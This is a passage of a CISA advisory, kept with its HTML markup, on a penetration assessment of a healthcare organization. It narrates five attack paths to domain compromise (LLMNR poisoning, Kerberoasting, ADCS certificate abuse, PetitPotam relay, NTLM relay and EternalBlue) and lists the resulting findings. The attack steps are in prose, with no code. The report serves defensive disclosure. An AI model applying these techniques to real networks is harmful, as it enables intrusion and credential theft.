manufacturers recommendations for improving their organizations’ and customers’ cyber posture, which reduces the impact of follow-on activity after initial access. CISA encourages the HPH sector and other critical infrastructure organizations deploying on-premises software, as well as software manufacturers, to apply the recommendations in the Mitigations section of this CSA to harden networks against malicious activity and to reduce the likelihood of domain compromise.</p>\n<p>Download the PDF version of this report:</p>\n\n\n\n\n\n<div class=\"c-file\">\n    <div class=\"c-file__download\">\n    <a href=\"/sites/default/files/2023-12/aa23-349a-risk-vulnerability-assessment-healthcare-public-health-sector.pdf\" class=\"c-file__link\" target=\"_blank\">AA23-349A Enhancing Cyber Resilience: Insights from the CISA Healthcare and Public Health Sector Risk and Vulnerability Assessment</a>\n    <span class=\"c-file__size\">(PDF,       744.23 KB\n  )</span>\n  </div>\n</div>\n<h3><strong>TECHNICAL DETAILS</strong></h3>\n<p><strong>Note:</strong> This advisory uses the <a href=\"https://attack.mitre.org/versions/v14/matrices/enterprise/\" title=\"Enterprise Matrix\">MITRE ATT&amp;CK for Enterprise</a> framework, version 14. See the MITRE ATT&amp;CK Tactics and Techniques section for tables of the threat actors’ activity mapped to MITRE ATT&amp;CK<sup>®</sup> tactics and techniques with corresponding mitigation and/or detection recommendations. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK Mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">Decider Tool</a>.</p>\n<h4><strong>Introduction</strong></h4>\n<p>CISA has authority to, upon request, provide analyses, expertise, and other technical assistance to critical infrastructure owners and operators and provide operational and timely technical assistance to federal and non-federal entities with respect to cybersecurity risks. <em>See generally</em> 6 U.S.C. §§ 652(c)(5), 659(c)(6). After receiving a request for an RVA from the organization and coordinating high-level details of the engagement with certain personnel at the organization, CISA conducted the RVA in January 2023.</p>\n<p>During RVAs, CISA tests the security posture of an organization’s network over a two-week period to determine the risk, vulnerability, and exploitability of systems and networks. During the first week (the external phase), the team tests public facing systems to identify exploitable vulnerabilities. During the second week (the internal phase), the team determines the susceptibility of the environment to an actor with internal access (e.g., malicious cyber actor or insider threat). The assessment team offers five services:</p>\n<ul><li><strong>Web Application Assessment:</strong> The assessment team uses commercial and open source tools to identify vulnerabilities in public-facing and internal web applications, demonstrating how they could be exploited.</li>\n<li><strong>Phishing Assessment:</strong> The assessment team tests the susceptibility of staff and infrastructure to phishing attacks and determines what impact a phished user workstation could have on the internal network. The RVA team crafts compelling email pretexts and generates payloads, similar to ones used by threat actors, in order to provide a realistic threat perspective to the organization.</li>\n<li><strong>Penetration Testing:</strong> The assessment team tests the security of an environment by simulating scenarios an advanced cyber actor may attempt. The team’s goals are to establish a foothold, escalate privileges, and compromise the domain. The RVA team leverages both open source and commercial tools for host discovery, port and service mapping, vulnerability discovery and analysis, and vulnerability exploitation.</li>\n<li><strong>Database Assessment:</strong> The assessment team uses commercial database tools to review databases for misconfigurations and missing patches.</li>\n<li><strong>Wireless Assessment:</strong> The assessment team uses specialized wireless hardware to assess wireless access points, connected endpoints, and user awareness for vulnerabilities.</li>\n</ul><p>The assessed organization was in the HPH sector. See Table 1 for services in-scope for this RVA.</p>\n<table class=\"MsoTableGrid tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 1: In-Scope RVA Services</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Phase</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Scope</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Services</strong></th>\n</tr></thead><tbody><tr><td>\n<p>External Assessment</p>\n</td>\n<td>\n<p>Publicly available HPH-organization endpoints discovered during scanning</p>\n</td>\n<td>\n<p>Penetration Testing</p>\n<p>Phishing Assessment</p>\n<p>Web Application Assessment</p>\n</td>\n</tr><tr><td>\n<p>Internal Assessment</p>\n</td>\n<td>\n<p>Internally available HPH-organization endpoints discovered during scanning</p>\n</td>\n<td>\n<p>Database Assessment</p>\n<p>Penetration Testing</p>\n<p>Web Application Assessment</p>\n<p>Wireless Assessment</p>\n</td>\n</tr></tbody></table><h4><strong>Phase I: External Assessment</strong></h4>\n<h5><em><strong>Penetration and Web Application Testing</strong></em></h5>\n<p>The CISA team did not identify any significant or exploitable conditions from penetration or web application testing that may allow a malicious actor to easily obtain initial access to the organization’s network.</p>\n<h5><strong>Phishing Assessment</strong></h5>\n<p>The CISA team conducted phishing assessments that included both user and systems testing.</p>\n<p>The team’s phishing assessment was unsuccessful because the organization’s defensive tools blocked the execution of the team’s payloads. The payload testing resulted in most of the team’s payloads being blocked by host-based protections through a combination of browser, policy, and antivirus software. Some of the payloads were successfully downloaded to disk without being immediately removed, but upon execution, the antivirus software detected the malicious code and blocked it from running. Some payloads appeared to successfully evade host-based protections but did not create a connection to the command and control (C2) infrastructure, indicating they may have been incompatible with the system or blocked by border protections.</p>\n<p>Since none of the payloads successfully connected to the assessment team’s C2 server, the team conducted a credential harvesting phishing campaign. Users were prompted to follow a malicious link within a phishing email under the pretext of verifying tax information and were then taken to a fake login form.</p>\n<p>While twelve unique users from the organization submitted credentials through the malicious form, the CISA team was unable to leverage the credentials because they had limited access to external-facing resources. Additionally, the organization had multi-factor authentication (MFA) implemented for cloud accounts. <strong>Note:</strong> At the time of the assessment, the CISA team’s operating procedures did not include certain machine-in-the-middle attacks that could have circumvented the form of MFA in place. However, it is important to note that tools like Evilginx[<a href=\"https://github.com/kgretzky/evilginx\" title=\"kgretzky / evilginx\">1</a>] can be leveraged to bypass non-phishing resistant forms of MFA. Furthermore, if a user executes a malicious file, opening a connection to a malicious actor’s command and control server, MFA will not prevent the actor from executing commands and carrying out actions under the context of that user.</p>\n<h4><strong>Phase II: Internal Assessment</strong></h4>\n<h5><em><strong>Database, Web Application, and Wireless Testing</strong></em></h5>\n<p>The CISA assessment team did not identify any significant or exploitable conditions from database or wireless testing that may allow a malicious actor to easily compromise the confidentiality, integrity, and availability of the tested environment.</p>\n<p>The team did identify default credentials [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1078/001/\" title=\"Valid Accounts: Default Accounts\">T1078.001</a>] for multiple web interfaces during web application testing and used default printer credentials while penetration testing. (See the Attack Path 2 section for more information.)</p>\n<h5><em><strong>Penetration Testing</strong></em></h5>\n<p>The assessment team starts internal penetration testing with a connection to the organization’s network but without a valid domain account. The team’s goal is to compromise the domain by gaining domain admin or enterprise administrator-level permissions. Generally, the team first attempts to gain domain user access and then escalate privileges until the domain is compromised. This process is called the “attack path”—acquiring initial access to an organization and escalating privileges until the domain is compromised and/or vital assets for the organization are accessed. The attack path requires specialized expertise and is realistic to what adversaries may do in an environment.</p>\n<p>For this assessment, the team compromised the organization’s domain through four unique attack paths, and in a fifth attack path the team obtained access to sensitive information.</p>\n<p>See the sections below for a description of the team’s attack paths mapped to the MITRE ATT&amp;CK for Enterprise framework. See the Findings section for information on issues that enabled the team to compromise the domain.</p>\n<h6><em><strong>Attack Path 1</strong></em></h6>\n<p>The assessment team initiated LLMNR/NBT-NS/mDNS/DHCP poisoning [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1557/001/\" title=\"Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay\">T1557.001</a>] with Responder[<a href=\"https://github.com/lgandx/Responder\" title=\"lgandx / Responder\">2</a>], which works in two steps:</p>\n<ol><li>Responder listens to multicast name resolution queries (e.g., <code>LLMNR UDP/5355</code>, <code>NBTNS UDP/137</code>) [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1040/\" title=\"Network Sniffing\">T1040</a>] and under the right conditions spoofs a response to direct the victim host to a CISA-controlled machine on which Responder is running.</li>\n<li>Once a victim connects to the machine, Responder exploits the connection to perform malicious functions such as stealing credentials or opening a session on a targeted host [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1021/\" title=\"Remote Services\">T1021</a>].</li>\n</ol><p>With this tool, the CISA team captured fifty-five New Technology Local Area Network Manager version 2 (NTLMv2) hashes, including the NTLMv2 hash for a service account. <strong>Note:</strong> NTLMv2 and other variations of the hash protocol are used for clients to join a domain, authenticate between Active Directory forests, authenticate between earlier versions of Windows operating systems (OSs), and authenticate computers that are not normally a part of the domain.[<a href=\"https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level\" title=\"Network security: LAN Manager authentication level\">3</a>] Cracking these passwords may enable malicious actors to establish a foothold in the domain and move laterally or elevate their privileges if the hash belongs to a privileged account.</p>\n<p>The service account had a weak password, allowing the team to quickly crack it [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1110/002/\" title=\"Brute Force: Password Cracking\">T1110.002</a>] and obtain access to the organization’s domain. With domain access, the CISA assessment team enumerated accounts with a Service Principal Name (SPN) set [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1087/002/\" title=\"Account Discovery: Domain Account\">T1087.002</a>]. SPN is the unique service identifier used by Kerberos authentication[<a href=\"https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names\" title=\"Service principal names\">4</a>], and accounts with SPN are susceptible to Kerberoasting.</p>\n<p>The CISA team used Impacket’s[<a href=\"https://github.com/fortra/impacket\" title=\"fortra / impacket\">5</a>] GetUserSPNs tool to request Ticket-Granting Service (TGS) tickets for all accounts with SPN set and obtained their Kerberos hashes [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1558/003/\" title=\"Steal or Forge Kerberos Tickets: Kerberoasting\">T1558.003</a>]. Three of these accounts had domain administrator privileges—offline, the team cracked ACCOUNT 1 (which had a weak password).</p>\n<p>Using CrackMapExec[<a href=\"https://github.com/Porchetta-Industries/CrackMapExec\" title=\"byt3bl33d3r / CrackMapExec\">6</a>], the assessment team used ACCOUNT 1 [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1078/002/\" title=\"Valid Accounts: Domain Accounts\">T1078.002</a>] to successfully connect to a domain controller (DC). The team confirmed they compromised the domain because ACCOUNT 1 had <code>READ,WRITE</code> permissions over the <code>C$</code> administrative share [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1021/002/\" title=\"Remote Services: SMB/Windows Admin Shares\">T1021.002</a>] (see Figure 1).</p>\n\n\n\n<figure class=\"c-figure c-figure--image u-align-center\" role=\"group\"><div class=\"c-figure__media\">    <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2023-12/Figure%201%20-%20ACCOUNT%201%20Domain%20Admin%20Privileges.png?itok=cARq9lWe\" width=\"670\" height=\"141\" alt=\"Figure 1: ACCOUNT 1 Domain Admin Privileges\" /></div>\n      <figcaption class=\"c-figure__caption\"><em>Figure 1: ACCOUNT 1 Domain Admin Privileges</em></figcaption></figure><p>To further demonstrate the impact of compromising ACCOUNT 1, the assessment team used it to access a virtual machine interface. If a malicious actor compromised ACCOUNT 1, they could use it to modify, power off [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1529/\" title=\"System Shutdown/Reboot\">T1529</a>], and/or delete critical virtual machines, including domain controllers and file servers.</p>\n<h6><em><strong>Attack Path 2</strong></em></h6>\n<p>The team first mapped the network to identify open web ports [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1595/001/\" title=\"Active Scanning: Scanning IP Blocks\">T1595.001</a>], and then attempted to access various web interfaces [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1133/\" title=\"External Remote Services\">T1133</a>] with default administrator credentials. The CISA team was able to log into a printer interface with a default password and found the device was configured with domain credentials to allow employees to save scanned documents to a network share [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1080/\" title=\"Taint Shared Content\">T1080</a>].</p>\n<p>While logged into the printer interface as an administrator, the team 1) modified the “Save as file” configuration to use File Transfer Protocol (FTP) instead of Server Message Block (SMB) and 2) changed the Server Name and Network Path to point to a CISA-controlled machine running Responder [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1557/\" title=\"Adversary-in-the-Middle\">T1557</a>]. Then, the team executed a “Connection Test” that sent the username and password over FTP [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1187/\" title=\"Forced Authentication\">T1187</a>] to the CISA machine running Responder, which captured cleartext credentials for a non-privileged domain account (ACCOUNT 2).</p>\n<p>Using ACCOUNT 2 and Certipy[<a href=\"https://github.com/ly4k/Certipy\" title=\"Certipy\">7</a>], the team enumerated potential certificate template vulnerabilities found in Active Directory Certificate Services (ADCS). <strong>Note:</strong> ADCS templates are used to build certificates for different types of servers and other entities on an organization’s network. Malicious actors can exploit template misconfigurations [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1649/\" title=\"Steal or Forge Authentication Certificates\">T1649</a>] to manipulate the certificate infrastructure into issuing fraudulent certificates and/or escalate user privileges to a domain administrator.</p>\n<p>The <code>WebServer</code> template was misconfigured to allow all authenticated users permission to:</p>\n<ul><li>Change the properties of the template (via <code>Object Control Permissions</code> with <code>Write Property Principals</code> set to <code>Authenticated Users</code>).</li>\n<li>Enroll for the certificate (via <code>Enrollment Permissions</code> including the <code>Authenticated Users</code> group).</li>\n<li>Request a certificate for a different user (via <code>EnrolleeSuppliesSubject</code> set as <code>True</code>).</li>\n</ul><p>See Figure 2 for the displayed certificate template misconfigurations.</p>\n  \n  \n  \n  \n<figure class=\"c-figure c-figure--large c-figure--image u-align-center\" role=\"group\"><div class=\"c-figure__media\">  <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2023-12/Figure%202%20-%20Misconfigured%20Certificate%20Template%20Enumerated%20via%20Certipy.png?itok=9nEucGuk\" width=\"533\" height=\"455\" alt=\"Figure 2: Misconfigured Certificate Template Enumerated via Certipy\" /></div>\n  </figure><p>The template’s <code>Client Authentication</code> was set to <code>False</code>, preventing the CISA assessment team from requesting a certificate that could be used to authenticate to a server in the domain. To demonstrate how this misconfiguration could lead to privilege escalation, the assessment team, leveraging its status as a mere authenticated user, briefly changed the <code>WebServer</code> template properties to set <code>Client Authentication</code> to <code>True</code> so that a certificate could be obtained for server authentication, ensuring the property was set back to its original setting of <code>False</code> immediately thereafter.</p>\n<p>The team used Certipy with the ACCOUNT 2 credentials to request a certificate for a Domain Administrator account (ACCOUNT 3). The team then authenticated to the domain controller as ACCOUNT 3 with the generated certificate [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1550/\" title=\"Use Alternate Authentication Material\">T1550</a>] and retrieved the NTLM hash for ACCOUNT 3 [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a>]. The team used the hash to authenticate to the domain controller [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1550/002/\" title=\"Use Alternate Authentication Material: Pass the Hash\">T1550.002</a>] and validated Domain Administrator privileges, demonstrating compromise of the domain via the <code>WebServer</code> template misconfiguration.</p>\n<h6><strong><em>Attack Path 3</em></strong></h6>\n<p>The CISA team used a tool called CrackMapExec to spray easily guessable passwords [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1110/003/\" title=\"Brute Force: Password Spraying\">T1110.003</a>] across all domain accounts and obtained two sets of valid credentials for standard domain user accounts.</p>\n<p>The assessment team leveraged one of the domain user accounts (ACCOUNT 4) to enumerate ADCS via Certipy and found that web enrollment was enabled (see Figure 3). If web enrollment is enabled, malicious actors can abuse certain services and/or misconfigurations in the environment to coerce a server to authenticate to an actor-controlled computer, which can relay the authentication to the ADCS web enrollment service and obtain a certificate for the server’s account (known as a relay attack).</p>\n\n\n\n<figure class=\"c-figure c-figure--image u-align-center\" role=\"group\"><div class=\"c-figure__media\">    <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2023-12/Figure%203%20-%20Misconfigured%20ADCS%20Enumerated%20via%20Certipy.png?itok=1Z-Pu9sU\" width=\"661\" height=\"323\" alt=\"Figure 3: Misconfigured ADCS Enumerated via Certipy\" /></div>\n      <figcaption class=\"c-figure__caption\"><em>Figure 3: Misconfigured ADCS Enumerated via Certipy</em></figcaption></figure><p>The team used PetitPotam [<a href=\"https://github.com/topotam/PetitPotam\" title=\"topotam / PetitPotam\">8</a>] with ACCOUNT 4 credentials to force the organization’s domain controller to authenticate to the CISA-operated machine and then used Certipy to relay the coerced authentication attempt to the ADCS web enrollment service to receive a valid certificate for ACCOUNT 5, the domain controller machine account. They used this certificate to acquire a TGT [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1558/\" title=\"Steal or Forge Kerberos Tickets\">T1558</a>] for ACCOUNT 5.</p>\n<p>With the TGT for ACCOUNT 5, the CISA team used <code>DCSync</code> to dump the NTLM hash [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/006\" title=\"OS Credential Dumping: DCSync\">T1003.006</a>] for ACCOUNT 3 (a Domain Administrator account [see <a href=\"#_Attack_Path_2\">Attack Path 2</a> section]), effectively leading to domain compromise.</p>\n<h6><strong><em>Attack Path 4</em></strong></h6>\n<p>The CISA team identified several systems on the organization’s network that do not enforce SMB signing. The team exploited this misconfiguration to obtain cleartext credentials for two domain administrator accounts.</p>\n<p>First, the team used Responder to capture the NTLMv2 hash for a domain administrator account. Next, they used Impacket’s NTLMrelayx tool[<a href=\"https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py\" title=\"fortra / impacket\">9</a>] to relay the authentication for the domain administrator, opening a SOCKS connection on a host that did not enforce SMB signing. The team then used DonPAPI[<a href=\"https://github.com/login-securite/DonPAPI\" title=\"login-securite / DonPAPI\">10</a>] to dump cleartext credentials through the SOCKS connection and obtained credentials for two additional domain administrator accounts.</p>\n<p>The CISA team validated the privileges of these accounts by checking for <code>READ,WRITE</code> access on a domain controller <code>C$</code> share [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1039/\" title=\"Data from Network Shared Drive\">T1039</a>], demonstrating Domain Administrator access and therefore domain compromise.</p>\n<h6><strong><em>Attack Path 5</em></strong></h6>\n<p>The team did vulnerability scanning [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1046/\" title=\"Network Service Discovery\">T1046</a>] and identified a server vulnerable to <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-0144\" title=\"CVE-2017-0144\">CVE-2017-0144</a> (an Improper Input Validation [<a href=\"https://cwe.mitre.org/data/definitions/20.html\" title=\"CWE-20: Improper Input Validation\">CWE-20</a>] vulnerability known as “EternalBlue” that affects SMB version 1 [SMBv1] and enables remote code execution [see Figure 4]).</p>\n\n\n\n<figure class=\"c-figure c-figure--image u-align-center\" role=\"group\"><div class=\"c-figure__media\">    <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2023-12/Figure%204%20-%20Checking%20for%20EternalBlue%20Vulnerability.png?itok=WMjX5PW9\" width=\"626\" height=\"106\" alt=\"Figure 4: Checking for EternalBlue Vulnerability\" /></div>\n      <figcaption class=\"c-figure__caption\"><em>Figure 4: Checking for EternalBlue Vulnerability</em></figcaption></figure><p>The CISA assessment team then executed a well-known EternalBlue exploit [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1210/\" title=\"Exploitation of Remote Services\">T1210</a>] and established a shell on the server. This shell allowed them to execute commands [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1059/003/\" title=\"Command and Scripting Interpreter: Windows Command Shell\">T1059.003</a>] under the context of the local <code>SYSTEM</code> account.</p>\n<p>With this local <code>SYSTEM</code> account, CISA dumped password hashes from a Security Account Manager (SAM) database [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/002/\" title=\"OS Credential Dumping: Security Account Manager\">T1003.002</a>]. The team parsed the hashes and identified one for a local administrator account. Upon parsing the contents of the SAM database dump, the CISA team identified an NTLM hash for the local administrator account, which can be used to authenticate to various services.</p>\n<p>The team sprayed the acquired NTLM hash across a network segment and identified multiple instances of password reuse allowing the team to access various resources including sensitive information with the hash.</p>\n<h4><strong>Findings</strong></h4>\n<h5><em><strong>Key Issues</strong></em></h5>\n<p>The CISA assessments team identified several findings as potentially exploitable vulnerabilities that could compromise the confidentiality, integrity, and availability of the tested environment. Each finding, listed below, includes a description with supporting details. See the Mitigations section for recommendations on how to mitigate these issues.</p>\n<p>The CISA team rated their findings on a severity scale from critical to informational (see Table 2).</p>\n<table class=\"MsoTableGrid tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 2: Severity Rating Criteria</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Severity</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Description</strong></th>\n</tr></thead><tbody><tr><td>\n<p>Critical</p>\n</td>\n<td>\n<p>Critical vulnerabilities pose an immediate and severe risk to the environment because of the ease of exploitation and potential impact. Critical items are reported to the customer immediately.</p>\n</td>\n</tr><tr><td>\n<p>High</p>\n</td>\n<td>\n<p>Malicious actors may be able to exercise full control on the targeted device.</p>\n</td>\n</tr><tr><td>\n<p>Medium</p>\n</td>\n<td>\n<p>Malicious actors may be able to exercise some control of the targeted device.</p>\n</td>\n</tr><tr><td>\n<p>Low</p>\n</td>\n<td>\n<p>The vulnerabilities discovered are reported as items of interest but are not normally exploitable. Many low items reported by security tools are not included in this report because they are often informational, unverified, or of minor risk.</p>\n</td>\n</tr><tr><td>\n<p>Informational</p>\n</td>\n<td>\n<p>These vulnerabilities are potential weaknesses within the system that cannot be readily exploited. These findings represent areas that the customer should be cognizant of, but do not require any immediate action.</p>\n</td>\n</tr></tbody></table><p>The CISA assessment team identified four High severity vulnerabilities and one Medium severity vulnerability during penetration testing that contributed to the team’s ability to compromise the domain. See Table 3 for a list and description of these findings.</p>\n<table class=\"MsoTableGrid tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 3: Key Issues Contributing to Domain Compromise</em></caption>\n<thead><tr><td><strong>Issue</strong></td>\n<td><strong>Severity</strong></td>\n<td><strong>Service</strong></td>\n<td><strong>Description</strong></td>\n</tr></thead><tbody><tr><td>\n<p>Poor Credential Hygiene: Easily Crackable Passwords</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>Penetration Testing</p>\n</td>\n<td>\n<p>As part of their assessment, the team reviewed the organization’s domain password policy and found it was weak because the minimum password length was set to 8 characters. Passwords less than 15 characters without randomness are easily crackable, and malicious actors with minimal technical knowledge can use these credentials to access the related services.</p>\n<p>The assessment team was able to easily crack many passwords throughout the assessment to move laterally and increase access within the domain. Specifically, the team:</p>\n<ul><li>Cracked the NTLMv2 hash for a domain account, and subsequently accessed the domain. (See the Attack Path 1 section.)</li>\n</ul><p>Cracked the password hash (obtained via Kerberoasting) of a domain administrator account and subsequently compromised the domain. (See the Attack Path 1 section.)</p>\n</td>\n</tr><tr><td>\n<p>Poor Credential Hygiene: Guessable Credentials</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>Penetration Testing</p>\n</td>\n<td>\n<p>As part of the penetration test, the assessment team tested to see if one or more services is accessible using a list of enumerated usernames alongside an easily guessed password. The objective is to see if a malicious actor with minimal technical knowledge can use these credentials to access the related services, enabling them to move laterally or escalate privileges. Easily guessable passwords are often comprised of common words, seasons, months and/or years, and are sometimes combined with special characters. Additionally, phrases or names that are popular locally (such as the organization being tested or a local sports teams) may also be considered easily guessable.</p>\n<p>The team sprayed common passwords against domain user accounts and obtained valid credentials for standard domain users. (See the Attack Path 3 section.) (Cracking was not necessary for this attack.)</p>\n</td>\n</tr><tr><td>\n<p>Misconfigured ADCS Certificate Templates</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>Penetration Testing</p>\n</td>\n<td>\n<p>The team identified a WebServer template configured to allow all authenticated users permission to change the properties of the template and obtain certificates for different users. The team exploited the template to acquire a certificate for a Domain Administrator account (see the Attack Path 2 section).</p>\n</td>\n</tr><tr><td>\n<p>Unnecessary Network Services Enabled</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>Penetration Testing</p>\n</td>\n<td>\n<p>Malicious actors can exploit security vulnerabilities and misconfigurations in network services, especially legacy services.</p>\n<p>The assessment team identified legacy name resolution protocols (e.g., NetBIOS, LLMNR, mDNS) enabled in the network, and abused LLMNR to capture NTLMv2 hashes, which they then cracked and used for domain access. (See the Attack Path 1 section.)</p>\n<p>The team also identified an ADCS server with web enrollment enabled and leveraged it to compromise the domain through coercion and relaying. (See Attack Path 3 section.)</p>\n<p>Additionally, the team identified hosts with <code>WebClient</code> and Spooler services, which are often abused by malicious actors to coerce authentication.</p>\n</td>\n</tr><tr><td>\n<p>Elevated Service Account Privileges</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>Penetration Testing</p>\n</td>\n<td>\n<p>Applications often require user accounts to operate. These user accounts, which are known as service accounts, often require elevated privileges. If an application or service running with a service account is compromised, an actor may have the same privileges and access as the service account.</p>\n<p>The CISA team identified a service account with Domain Administrator privileges and used it to access the domain after cracking its password (See the Attack Path 1 section).</p>\n</td>\n</tr><tr><td>\n<p>SMB Signing Not Enabled</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>Penetration Testing</p>\n</td>\n<td>\n<p>The CISA team identified several systems on the organization’s network that do not enforce SMB signing and exploited this for relayed authentication to obtain cleartext credentials for two domain administrator accounts.</p>\n</td>\n</tr><tr><td>\n<p>Insecure Default Configuration: Default Credentials</p>\n</td>\n<td>\n<p>Medium</p>\n</td>\n<td>\n<p>Web Application Assessment</p>\n</td>\n<td>\n<p>Many off-the-shelf applications are released with built-in administrative accounts using predefined credentials that can often be found with a simple web search. Malicious actors with minimal technical knowledge can use these credentials to access the related services.</p>\n<p>During testing, the CISA team identified multiple web interfaces with default administrator credentials and used default credentials for a printer interface to capture domain credentials of a non-privileged domain account. (See the Attack Path 2 section.)</p>\n</td>\n</tr></tbody></table><p>In addition to the issues listed above, the team identified three High and seven Medium severity findings. These vulnerabilities and misconfigurations may allow a malicious actor to compromise the confidentiality, integrity, and availability of the tested environment. See Table 4 for a list and description of these findings.</p>\n<table class=\"MsoTableGrid tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 4: Additional Key Issues</em></caption>\n<thead><tr><td><strong>Issue</strong></td>\n<td><strong>Severity</strong></td>\n<td><strong>Service</strong></td>\n<td><strong>Description</strong></td>\n</tr></thead><tbody><tr><td>\n<p>Poor Credential Hygiene: Password Reuse for Administrator and User Accounts</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>Penetration Testing</p>\n</td>\n<td>\n<p>Elevated password reuse is when an administrator uses the same password for their user and administrator accounts. If the user account password is compromised, it can be used to gain access to the administrative account.</p>\n<p>The assessment team identified an instance where the same password was set for an admin user’s administrative account as well as their standard user account.</p>\n</td>\n</tr><tr><td>\n<p>Poor Credential Hygiene: Password Reuse for Administrator Accounts</p>\n</td>\n<td>\n<p>Medium</p>\n</td>\n<td>\n<p>Penetration Testing</p>\n</td>\n<td>\n<p>If administrator passwords are the same for various administrator accounts, malicious actors can use the password to access all systems that share this credential after compromising one account.</p>\n<p>The assessment team found multiple instances of local administrator accounts across various systems using the same password.</p>\n</td>\n</tr><tr><td>\n<p>Poor Patch Management: Out-of-Date Software</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>Penetration Testing</p>\n</td>\n<td>\n<p>Patches and updates are released to address existing and emerging security vulnerabilities, and failure to apply the latest leaves systems open to attack with publicly available exploits. (The risk presented by missing patches and updates depends on the severity of the vulnerability).</p>\n<p>The assessment team identified several unpatched systems including instances of <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-0708\" title=\"CVE-2019-0708\">CVE-2019-0708</a> (known as “BlueKeep”) and EternalBlue.</p>\n<p>The team was unable to successfully compromise the systems with BlueKeep, but they did exploit EternalBlue on a server to implant a shell on a server with local <code>SYSTEM</code> privileges (see the Attack Path 5 section).</p>\n</td>\n</tr><tr><td>\n<p>Poor Patch Management: Unsupported OS or Application</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>Penetration Testing</p>\n</td>\n<td>\n<p>Using software or hardware that is no longer supported by the vendor poses a significant security risk because new and existing vulnerabilities are no longer patched). There is no way to address security vulnerabilities on these devices to ensure that they are secure. The overall security posture of the entire network is at risk because an attacker can target these devices to establish an initial foothold into the network.</p>\n<p>The assessment team identified end-of-life (EOL) Windows Server 2008 R2 and Windows Server 2008 and Windows 5.1.</p>\n</td>\n</tr><tr><td>\n<p>Use of Weak Authentication Measures</p>\n</td>\n<td>\n<p>Medium</p>\n</td>\n<td>\n<p>Penetration Testing</p>\n</td>\n<td>\n<p>Applications may have weak or broken mechanisms to verify user identity before granting user access to protected functionalities. Malicious actors can exploit these to bypass authentication and gain access to use application resources and functionality.</p>\n<p>The assessment team abused the Cisco Smart Install protocol to obtain configuration files for several Cisco devices on the organization’s network. These files contained encrypted Cisco passwords. (The CISA team was unable to crack these passwords within the assessment timeframe.)</p>\n</td>\n</tr><tr><td>\n<p>PII Disclosure</p>\n</td>\n<td>\n<p>Medium</p>\n</td>\n<td>\n<p>Penetration Testing</p>\n</td>\n<td>\n<p>The assessment team identified an unencrypted Excel file containing PII on a file share.</p>\n</td>\n</tr><tr><td>\n<p>Hosts with Unconstrained Delegation Enabled Unnecessarily</p>\n</td>\n<td>\n<p>Medium</p>\n</td>\n<td>\n<p>Penetration Testing</p>\n</td>\n<td>\n<p>The CISA team identified two systems that appeared to be configured with <code>Unconstrained Delegation</code> enabled. Hosts with <code>Unconstrained Delegation</code> enabled store the Kerberos TGTs of all users that authenticate to that host, enabling actors to steal service tickets or compromise krbtgt accounts and perform <a href=\"https://attack.mitre.org/versions/v14/techniques/T1558/001/\" 